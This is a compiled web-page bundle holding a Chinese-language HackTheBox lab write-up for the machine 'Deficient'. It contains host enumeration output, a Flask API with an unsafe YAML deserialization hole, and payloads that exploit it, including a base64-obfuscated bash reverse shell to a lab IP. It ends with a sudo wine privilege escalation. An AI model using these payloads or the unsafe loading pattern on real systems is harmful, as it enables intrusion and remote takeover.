"use strict";(self.webpackChunktarget_machines_write_up=self.webpackChunktarget_machines_write_up||[]).push([[4263],{97012:(n,e,s)=>{s.r(e),s.d(e,{assets:()=>c,contentTitle:()=>o,default:()=>l,frontMatter:()=>i,metadata:()=>r,toc:()=>p});const r=JSON.parse('{"id":"HackTheBox/Battlegrounds/Cyber Mayhem/Deficient","title":"Deficient","description":"\u4fe1\u606f\u6536\u96c6","source":"@site/docs/HackTheBox/Battlegrounds/Cyber Mayhem/Deficient.md","sourceDirName":"HackTheBox/Battlegrounds/Cyber Mayhem","slug":"/HackTheBox/Battlegrounds/Cyber Mayhem/Deficient","permalink":"/Target-Machines-WriteUp/docs/HackTheBox/Battlegrounds/Cyber Mayhem/Deficient","draft":false,"unlisted":false,"editUrl":"https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/docs/HackTheBox/Battlegrounds/Cyber Mayhem/Deficient.md","tags":[],"version":"current","frontMatter":{},"sidebar":"HackTheBox_Sidebar","previous":{"title":"Creativity","permalink":"/Target-Machines-WriteUp/docs/HackTheBox/Battlegrounds/Cyber Mayhem/Creativity"},"next":{"title":"Defy","permalink":"/Target-Machines-WriteUp/docs/HackTheBox/Battlegrounds/Cyber Mayhem/Defy"}}');var a=s(74848),t=s(28453);const i={},o="Deficient",c={},p=[{value:"\u4fe1\u606f\u6536\u96c6",id:"\u4fe1\u606f\u6536\u96c6",level:2},{value:"Python HTTP Server",id:"python-http-server",level:2},{value:"\u63d0\u6743",id:"\u63d0\u6743",level:2}];function u(n){const e={a:"a",code:"code",h1:"h1",h2:"h2",header:"header",p:"p",pre:"pre",...(0,t.R)(),...n.components};return(0,a.jsxs)(a.Fragment,{children:[(0,a.jsx)(e.header,{children:(0,a.jsx)(e.h1,{id:"deficient",children:"Deficient"})}),"\n",(0,a.jsx)(e.h2,{id:"\u4fe1\u606f\u6536\u96c6",children:"\u4fe1\u606f\u6536\u96c6"}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-bash",children:'Detected ss and lsof, executing related commands...\nPort: 5000, PID: 725\n\u2014> Command: python3 /opt/projects/api/index.py \nPort: 53, PID: 560\n\u2014> Command: /lib/systemd/systemd-resolved \nPort: 22, PID: 778\n\u2014> Command: sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups \nPort: 5432, PID: 826\n\u2014> Command: /usr/lib/postgresql/13/bin/postgres -D /var/lib/postgresql/13/main -c config_file=/etc/postgresql/13/main/postgresql.conf \n\n## \u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014 ##\n\nNginx is not installed.\n\n## \u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014 ##\n\nApache is not installed.\n\n## \u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014 ##\n\nChecking /etc/sudoers (active configurations only):\n  Defaults      env_reset\n  Defaults      mail_badpass\n  Defaults      secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"\n  root  ALL=(ALL:ALL) ALL\n  trajan        ALL=(ALL:root) NOPASSWD: /usr/bin/psql\n  trajan        ALL=(ALL:root) NOPASSWD: /usr/bin/psysh\n  trajan  ALL=(ALL:root) NOPASSWD: /usr/bin/wine-stable\n  %sudo ALL=(ALL:ALL) ALL\n\u2014\u2014\u2014\nFinding SUID files:\n/usr/lib/snapd/snap-confine\n/usr/lib/openssh/ssh-keysign\n/usr/lib/policykit-1/polkit-agent-helper-1\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/usr/lib/eject/dmcrypt-get-device\n/usr/bin/newgrp\n/usr/bin/umount\n/usr/bin/sudo\n/usr/bin/chsh\n/usr/bin/at\n/usr/bin/su\n/usr/bin/wine-stable\n/usr/bin/chfn\n/usr/bin/mount\n/usr/bin/fusermount\n/usr/bin/pkexec\n/usr/bin/gpasswd\n/usr/bin/passwd\n/snap/snapd/7264/usr/lib/snapd/snap-confine\n/snap/snapd/11588/usr/lib/snapd/snap-confine\n/snap/core18/1705/bin/mount\n/snap/core18/1705/bin/ping\n/snap/core18/1705/bin/su\n/snap/core18/1705/bin/umount\n/snap/core18/1705/usr/bin/chfn\n/snap/core18/1705/usr/bin/chsh\n/snap/core18/1705/usr/bin/gpasswd\n/snap/core18/1705/usr/bin/newgrp\n/snap/core18/1705/usr/bin/passwd\n/snap/core18/1705/usr/bin/sudo\n/snap/core18/1705/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/snap/core18/1705/usr/lib/openssh/ssh-keysign\n/snap/core18/1997/bin/mount\n/snap/core18/1997/bin/ping\n/snap/core18/1997/bin/su\n/snap/core18/1997/bin/umount\n/snap/core18/1997/usr/bin/chfn\n/snap/core18/1997/usr/bin/chsh\n/snap/core18/1997/usr/bin/gpasswd\n/snap/core18/1997/usr/bin/newgrp\n/snap/core18/1997/usr/bin/passwd\n/snap/core18/1997/usr/bin/sudo\n/snap/core18/1997/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/snap/core18/1997/usr/lib/openssh/ssh-keysign\n\u2014\u2014\u2014\nFinding files with special capabilities:\n  /usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep\n  /usr/lib/i386-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep\n  /usr/bin/ping = cap_net_raw+ep\n  /usr/bin/traceroute6.iputils = cap_net_raw+ep\n  /usr/bin/wine-stable = cap_setuid+ep\n  /usr/bin/mtr-packet = cap_net_raw+ep\n\u2014\u2014\u2014\nNo nginx or apache2 process is running.\n'})}),"\n",(0,a.jsx)(e.h2,{id:"python-http-server",children:"Python HTTP Server"}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-python",metastring:'title="/opt/projects/api/index.py"',children:"#!/usr/bin/env python3\nimport flask\nimport yaml\nfrom flask import request\nimport base64\n\napp = flask.Flask(__name__)\napp.config[\"DEBUG\"] = False\n\n\n@app.route('/', methods=['GET'])\ndef home():\n    return \"<h1>Archive</h1><p>internal API.</p>\"\n\n\n@app.route('/search', methods=['GET'])\ndef search():\n    para = request.args\n    data = para.get('yaml')\n    d = base64.b64decode(data)\n    de = yaml.unsafe_load(d)\n    return de\n\napp.run('0.0.0.0')\n"})}),"\n",(0,a.jsx)(e.p,{children:"\u6253 Python \u7684 yaml \u53cd\u5e8f\u5217\u5316"}),"\n",(0,a.jsx)(e.p,{children:(0,a.jsx)(e.a,{href:"https://github.com/j0lt-github/python-deserialization-attack-payload-generator",children:"j0lt-github/python-deserialization-attack-payload-generator"})}),"\n",(0,a.jsx)(e.p,{children:"\u6216\u8005"}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-bash",children:'echo \'!!python/object/apply:subprocess.check_output [["cat","/opt/flag.txt"]]\' | base64\n# \u8d5b\u68cd\u73a9\u6cd5\necho \'!!python/object/apply:subprocess.check_output [["bash", "-c", "$(echo KGJhc2ggPiYgL2Rldi90Y3AvMTAuMTAuMTQuMy84MCAwPiYxKSAm | base64 -d | bash)"]]\' | base64\n'})}),"\n",(0,a.jsx)(e.h2,{id:"\u63d0\u6743",children:"\u63d0\u6743"}),"\n",(0,a.jsxs)(e.p,{children:["\u4e0a\u4f20\u4e00\u4e2a Windows \u7684 ",(0,a.jsx)(e.code,{children:"cmd.exe"})," \u4e4b\u540e"]}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-bash",children:"sudo /usr/bin/wine-stable cmd.exe\n"})})]})}function l(n={}){const{wrapper:e}={...(0,t.R)(),...n.components};return e?(0,a.jsx)(e,{...n,children:(0,a.jsx)(u,{...n})}):u(n)}},28453:(n,e,s)=>{s.d(e,{R:()=>i,x:()=>o});var r=s(96540);const a={},t=r.createContext(a);function i(n){const e=r.useContext(t);return r.useMemo((function(){return"function"==typeof n?n(e):{...e,...n}}),[e,n])}function o(n){let e;return e=n.disableParentContext?"function"==typeof n.components?n.components(a):n.components||a:i(n.components),r.createElement(t.Provider,{value:e},n.children)}}}]);